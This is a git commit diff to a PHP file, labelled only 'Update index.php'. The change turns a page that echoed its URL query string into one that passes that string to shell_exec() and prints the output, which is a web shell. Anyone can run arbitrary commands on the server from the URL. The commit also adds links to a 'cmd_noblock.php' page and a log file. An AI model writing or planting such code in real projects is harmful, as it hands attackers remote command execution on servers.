f1e19462b4a2a7c004df98b8e7b6c2e328f8bf89
laiyuantemp <100673133+laiyuantemp@users.noreply.github.com>
2022-08-16 13:50:17 +0800

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,8 @@
 <pre>
 <?php
   $cmd = substr($_SERVER['REQUEST_URI'], strpos($_SERVER['REQUEST_URI'], "?", 1)+1);
-  echo $cmd;
+  echo shell_exec($cmd);
 ?>
 </pre><br>
-<a href="/log.txt">cmd</a>
+<a href="/cmd_noblock.php">cmd no block</a>
+<a href="/log.txt">log file</a>
